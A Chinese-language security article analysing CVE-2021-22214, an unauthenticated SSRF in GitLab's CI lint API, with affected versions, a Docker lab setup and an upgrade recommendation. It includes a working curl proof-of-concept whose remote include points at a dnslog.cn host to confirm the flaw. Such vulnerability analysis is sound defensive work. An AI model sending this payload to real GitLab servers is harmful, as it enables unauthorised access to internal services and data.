# CVE-2021-22214 GITLAB SSRF 未授权漏洞

阅读量 **148653**

发布时间 : 2022-04-12 15:30:55

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01c4b08e6a69993563.png)

## 漏洞描述

GitLab是美国GitLab公司的一款使用Ruby on
Rails开发的、自托管的、Git（版本控制系统）项目仓库应用程序。该程序可用于查阅项目的文件内容、提交历史、Bug列表等。Gitlab的CI lint
API用于验证提供给gitlab ci的配置文件是否是yaml格式。而根据其说明文档文档，其include
操作支持remote选项，用于获取远端的yaml。因此在此处将remote参数设置为本地回环地址，同时由于后端会检查最后扩展名，加上?test.yaml
即可绕过。远程攻击者可通过发送特殊构造的 HTTP
请求，欺骗应用程序向任意系统发起请求。攻击者成功利用该漏洞可获得敏感数据的访问权限或向其他服务器发送恶意请求。

## 利用条件

13.10.5 > GitLab >= 10.5

13.11.5 > GitLab >= 13.11

13.12.2 > GitLab >= 13.12

## 环境搭建

使用docker 搭建环境：

docker pull vulfocus/gitlab-cve_2021_22214:latest

docker run -d -P vulfocus/gitlab-cve_2021_22214

访问成功、环境搭建成功！

![](https://p0.ssl.qhimg.com/t01b1706762042acc65.jpg)

## 漏洞分析

### **漏洞原理**

CVE官方给出的描述是 gitlab ssrf 未授权漏洞。

![](https://p2.ssl.qhimg.com/t010ff05db4e45537d0.jpg)

doc/api/lint.md 文件中提到对测试 yml文件是否有效。

![](https://p3.ssl.qhimg.com/t01180a8d6e0f753f7c.jpg)

该漏洞源于对用户提供数据的验证不足，远程攻击者可通过发送特殊构造的 HTTP
请求，欺骗应用程序向任意系统发起请求。攻击者成功利用该漏洞可获得敏感数据的访问权限或向其他服务器发送恶意请求。

使用curl命令配合dnslog.cn 做漏洞测试。

    
    
    curl -s --show-error -H 'Content-Type: application/json' http://127.0.0.1:55001/api/v4/ci/lint --data '{ "include_merged_yaml": true, "content": "include:\n remote: http://543jeh.dnslog.cn/api/v1/targets/?test.yml"}'

在DNSlog记录发现的访问记录，表明漏洞存在。

![](https://p2.ssl.qhimg.com/t01dd2ff124658a0e85.jpg)

## 修复建议

当前官方已发布最新版本，建议受影响的用户及时更新升级到最新版本。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **星阑科技** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/271555](/post/id/271555)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [GITLAB SSRF](/tag/GITLAB SSRF)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t01ae1a72a720da3a7b.png) 星阑科技

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

